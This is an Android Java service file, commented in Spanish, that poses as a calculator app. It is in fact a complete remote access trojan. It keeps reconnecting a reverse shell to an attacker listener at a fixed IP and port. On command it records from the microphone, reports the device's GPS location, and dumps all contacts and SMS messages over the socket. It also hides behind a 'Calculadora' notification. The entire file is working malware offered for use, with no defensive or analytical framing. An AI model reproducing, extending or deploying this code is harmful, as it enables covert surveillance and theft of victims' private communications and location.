package com.sourav.mohanty.calculator;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

// --- CORRECCIONES Y NUEVAS IMPORTACIONES DE SOPORTE ---
import androidx.annotation.NonNull; 
import android.os.Bundle;             
// --- FIN CORRECCIONES ---

// --- IMPORTACIONES CLAVE ---
import android.media.MediaRecorder;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager; 
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract; // Para volcar Contactos
// --- FIN IMPORTACIONES CLAVE ---

import java.io.OutputStream;
import java.net.Socket;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class DogoService extends Service {

    private static final String TAG = "DogoService";
    private static final String CHANNEL_ID = "DogoServiceChannel";
    
    // --- Configuración de la Reverse Shell ---
    private final String LHOST = "192.168.0.106"; // IP DE TU LISTENER
    private final int LPORT = 4444;              
    // ----------------------------------------

    private ScheduledExecutorService scheduler;
    private Socket socket;
    private Process shellProcess;

    // --- Variables de control de Audio/GPS ---
    private MediaRecorder recorder = null;
    private String audioFilePath = null;
    private final String AUDIO_FILENAME = "audio_capture.mp4"; 
    private LocationManager locationManager = null;
    private LocationListener locationListener = null;
    // ----------------------------------------

    // ====================================================================================
    // MÉTODOS DE CONTROL DE AUDIO
    // ====================================================================================
    
    private void startRecording(OutputStream socketOut) {
        if (recorder != null) return;
        
        File externalFilesDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
        if (externalFilesDir == null) return; 

        audioFilePath = new File(externalFilesDir, AUDIO_FILENAME).getAbsolutePath();
        
        recorder = new MediaRecorder();
        
        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(audioFilePath);
            
            recorder.prepare();
            recorder.start();
            Log.d(TAG, "Grabación iniciada en: " + audioFilePath);
            
            // Envía confirmación (Manejo de IOException)
            try {
                 socketOut.write(("Grabación de Audio: Iniciada. Duración máxima: 5 minutos.\n").getBytes());
                 socketOut.flush();
            } catch (IOException ignored) {}

        } catch (IllegalStateException | IOException e) {
            Log.e(TAG, "Error al iniciar la grabación: " + e.getMessage());
            releaseRecorder();
            try {
                socketOut.write(("ERROR al iniciar grabación: " + e.getMessage() + "\n").getBytes());
                socketOut.flush();
            } catch (IOException ignored) {}
        }
    }

    private void stopRecording(OutputStream socketOut) {
        if (recorder == null) return;
        try {
            recorder.stop();
            Log.d(TAG, "Grabación detenida. Archivo listo: " + audioFilePath);
            
            // Envía confirmación (CÓDIGO CORREGIDO para evitar IOException no reportada)
            try {
                String message = "Grabación de Audio: Detenida y guardada. Archivo: " + audioFilePath + "\n" +
                                 "Usa un SEGUNDO listener de Netcat para exfiltrar el archivo con el comando 'cat'.\n";
                socketOut.write(message.getBytes());
                socketOut.flush();
            } catch (IOException ignored) {}
            
        } catch (IllegalStateException e) {
            Log.e(TAG, "Error al detener la grabación: " + e.getMessage());
            try {
                socketOut.write(("ERROR al detener grabación: " + e.getMessage() + "\n").getBytes());
                socketOut.flush();
            } catch (IOException ignored) {}
        } finally {
            releaseRecorder();
        }
    }

    private void releaseRecorder() {
        if (recorder != null) {
            recorder.release();
            recorder = null;
        }
    }
    
    // ====================================================================================
    // MÉTODOS DE CONTROL DE GPS (NUEVA FUNCIÓN)
    // ====================================================================================

    private void getLocation(OutputStream socketOut) {
        if (locationManager != null) {
            releaseLocationListener();
        }

        try {
            locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            
            if (locationManager == null) {
                try { socketOut.write("ERROR: LocationManager no disponible.\n".getBytes()); socketOut.flush(); } catch (IOException ignored) {}
                return;
            }

            // Verificar si el proveedor GPS está habilitado
            if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                try { socketOut.write("ERROR: GPS del dispositivo no está activo.\n".getBytes()); socketOut.flush(); } catch (IOException ignored) {}
                return;
            }

            locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    try {
                        String lat = String.valueOf(location.getLatitude());
                        String lon = String.valueOf(location.getLongitude());
                        String acc = String.valueOf(location.getAccuracy());
                        
                        // Reporta la ubicación exacta
                        String message = String.format("GPS_DATA: Lat=%s, Lon=%s, Acc=%s metros.\n", lat, lon, acc);
                        socketOut.write(message.getBytes());
                        socketOut.flush();
                        
                        // Detiene las actualizaciones de ubicación
                        releaseLocationListener();
                    } catch (IOException ignored) {}
                }
                
                @Override public void onProviderDisabled(@NonNull String provider) {}
                @Override public void onProviderEnabled(@NonNull String provider) {}
                @Override public void onStatusChanged(String provider, int status, Bundle extras) {} 
            };

            locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, locationListener, null);
            
            try { socketOut.write("Solicitando ubicación GPS... espera unos segundos.\n".getBytes()); socketOut.flush(); } catch (IOException ignored) {}
            
        } catch (SecurityException e) { 
            try {
                socketOut.write(("ERROR al obtener GPS: Asegura que el permiso FINE_LOCATION está aceptado y el GPS está activo. Detalles: " + e.getMessage() + "\n").getBytes());
                socketOut.flush();
            } catch (IOException ignored) {}
        }
    }

    private void releaseLocationListener() {
        if (locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
            locationManager = null;
            locationListener = null;
        }
    }
    
    // ====================================================================================
    // MÉTODOS DE VOLCADO DE DATOS (CONTACTOS Y SMS)
    // ====================================================================================

    // Nuevo método para volcar la lista de contactos
    private void dumpContacts(OutputStream socketOut) {
        try {
            ContentResolver cr = getApplicationContext().getContentResolver();
            
            String[] projection = {
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            };
            
            Cursor cur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
                                   projection, null, null, null);

            if (cur != null && cur.getCount() > 0) {
                socketOut.write("\n================ CONTACTOS VOLCADOS ================\n".getBytes());
                
                int nameIndex = cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int phoneIndex = cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                
                while (cur.moveToNext()) {
                    String name = cur.getString(nameIndex);
                    String phone = cur.getString(phoneIndex);
                    
                    String line = String.format("NAME: %s | PHONE: %s\n", name, phone);
                    socketOut.write(line.getBytes());
                }
                socketOut.write("================ FIN CONTACTOS ================\n".getBytes());
                socketOut.flush();
                cur.close();
            } else {
                socketOut.write("INFO: No se encontraron contactos o el permiso fue denegado.\n".getBytes());
                socketOut.flush();
            }
            
        } catch (Exception e) {
            try {
                socketOut.write(("ERROR al volcar contactos: " + e.getMessage() + "\n").getBytes());
                socketOut.flush();
            } catch (IOException ignored) {}
        }
    }

    // Nuevo método para volcar el registro de SMS (buzón de entrada y salida)
    private void dumpSms(OutputStream socketOut) {
        try {
            
            Uri uri = Uri.parse("content://sms/");
            
            String[] projection = new String[] { "_id", "address", "body", "date", "type" };
            
            Cursor cur = getApplicationContext().getContentResolver().query(uri, projection, null, null, "date DESC");

            if (cur != null && cur.getCount() > 0) {
                socketOut.write("\n================ SMS VOLCADOS ================\n".getBytes());
                
                while (cur.moveToNext()) {
                    String address = cur.getString(cur.getColumnIndexOrThrow("address"));
                    String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                    int type = cur.getInt(cur.getColumnIndexOrThrow("type"));
                    
                    String typeStr = (type == 1) ? "INBOX" : "SENT";
                    
                    String line = String.format("FROM/TO: %s | TYPE: %s | MESSAGE: %s\n", address, typeStr, body);
                    socketOut.write(line.getBytes());
                }
                socketOut.write("================ FIN SMS ================\n".getBytes());
                socketOut.flush();
                cur.close();
            } else {
                socketOut.write("INFO: No se encontraron mensajes SMS o el permiso fue denegado.\n".getBytes());
                socketOut.flush();
            }
            
        } catch (Exception e) {
            try {
                socketOut.write(("ERROR al volcar SMS: " + e.getMessage() + "\n").getBytes());
                socketOut.flush();
            } catch (IOException ignored) {}
        }
    }


    // ====================================================================================
    // LÓGICA DEL SERVICIO Y RECONEXIÓN
    // ====================================================================================

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        
        Notification notification = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Calculadora")
                .setContentText("Procesando en segundo plano...")
                .setSmallIcon(R.mipmap.appicon) 
                .build();
        startForeground(1, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "DogoService iniciado.");
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleWithFixedDelay(this::connect, 0, 10, TimeUnit.SECONDS); // Intenta conectar cada 10s
        return START_STICKY;
    }

    private void connect() {
        if (socket != null && socket.isConnected()) return;

        try {
            Log.d(TAG, "Intentando conectar a " + LHOST + ":" + LPORT);
            socket = new Socket(LHOST, LPORT);
            Log.d(TAG, "Conexión exitosa. Iniciando shell.");
            
            shellProcess = new ProcessBuilder("/system/bin/sh").redirectErrorStream(true).start();

            // Configurar los redirectores de I/O
            Redirector inputRedirector = new Redirector(socket.getInputStream(), shellProcess.getOutputStream(), socket.getOutputStream());
            Redirector outputRedirector = new Redirector(shellProcess.getInputStream(), socket.getOutputStream(), null);
            
            inputRedirector.start();
            outputRedirector.start();
            
        } catch (IOException e) {
            Log.e(TAG, "Error de conexión o shell: " + e.getMessage());
            closeSocketAndProcess();
        }
    }

    private void closeSocketAndProcess() {
        try {
            if (socket != null) socket.close();
            socket = null;
        } catch (IOException e) {
            Log.e(TAG, "Error al cerrar socket: " + e.getMessage());
        }
        try {
            if (shellProcess != null) shellProcess.destroy();
            shellProcess = null;
        } catch (Exception e) {
            Log.e(TAG, "Error al cerrar proceso: " + e.getMessage());
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        releaseRecorder();
        releaseLocationListener(); 
        if (scheduler != null) scheduler.shutdownNow();
        closeSocketAndProcess();
        Log.d(TAG, "DogoService destruido.");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Dogo Service Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    // ====================================================================================
    // CLASE REDIRECTOR MODIFICADA
    // ====================================================================================

    private class Redirector extends Thread {
        private final InputStream is;
        private final OutputStream os;
        private final OutputStream socketOut; 

        public Redirector(InputStream is, OutputStream os, OutputStream socketOut) {
            this.is = is;
            this.os = os;
            this.socketOut = socketOut;
        }

        @Override
        public void run() {
            try {
                if (socketOut != null) { 
                    BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        
                        String command = line.trim();
                        
                        // 1. Intercepción de comandos de Control
                        if (command.equalsIgnoreCase("START_MIC")) {
                            startRecording(socketOut);
                        } else if (command.equalsIgnoreCase("STOP_MIC")) {
                            stopRecording(socketOut);
                        } else if (command.equalsIgnoreCase("GET_GPS")) { // ¡NUEVO COMANDO INTERCEPTADO!
                            getLocation(socketOut);
                        } else if (command.equalsIgnoreCase("DUMP_CONTACTS")) { // ¡NUEVO COMANDO!
                            dumpContacts(socketOut);
                        } else if (command.equalsIgnoreCase("DUMP_SMS")) { // ¡NUEVO COMANDO!
                            dumpSms(socketOut);
                        } else {
                            // 2. Si no es un comando de control, enviar a la shell nativa
                            os.write((command + "\n").getBytes());
                            os.flush();
                        }
                    }
                } else {
                    // Si es el hilo que lee la salida de la shell, solo redirige
                    byte[] buffer = new byte[8192];
                    int read;
                    while ((read = is.read(buffer)) != -1) {
                        os.write(buffer, 0, read);
                        os.flush();
                    }
                }
            } catch (IOException e) {
                Log.e(TAG, "Redirector IO Error: " + e.getMessage());
            } catch (Exception e) {
                Log.e(TAG, "Redirector General Error: " + e.getMessage());
            } finally {
                closeSocketAndProcess();
            }
        }
    }
}